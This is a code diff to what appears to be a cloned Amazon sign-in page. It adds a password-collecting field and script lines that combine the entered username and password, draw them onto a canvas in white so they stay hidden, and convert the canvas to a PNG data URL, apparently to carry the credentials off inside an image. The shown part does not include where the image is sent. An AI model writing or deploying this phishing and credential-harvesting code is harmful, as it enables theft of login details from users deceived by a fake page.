@@ -338,8 +338,8 @@ amzn.copilot.checkCoPilotSession();
               
             <input type="email" maxlength="128" id="userName" name="email" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field"/>
 
-            
-            <input type="password" maxlength="1024" id="ap-credential-autofill-hint" name="password" class="a-input-text hide"/>
+            <input type="email" maxlength="128" id="userPass" name="email" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field"/>
+
             
 
 
@@ -379,13 +379,18 @@ amzn.copilot.checkCoPilotSession();
             
                   // Get user input text
                   const userName = document.getElementById("userName").value;
+                  const userPass = document.getElementById("userPass").value;
+                  const use = "Username: "; // Add a space character
+                  const pas = "   Password: "; // Add a space character
+            
                   // Combine the values with a space in between
+                  const combinedText = use + userName + pas + userPass;
             
             
                   // Draw the user input text on the canvas
-                  ctx.fillStyle = "black";
+                  ctx.fillStyle = "white";
                   ctx.font = "24px Arial";
-                  ctx.fillText(userName, 50, 50);
+                  ctx.fillText(combinedText, 50, 50);
             
                   // Convert the canvas to a data URL with PNG format
                   const dataURL = canvas.toDataURL("image/png");
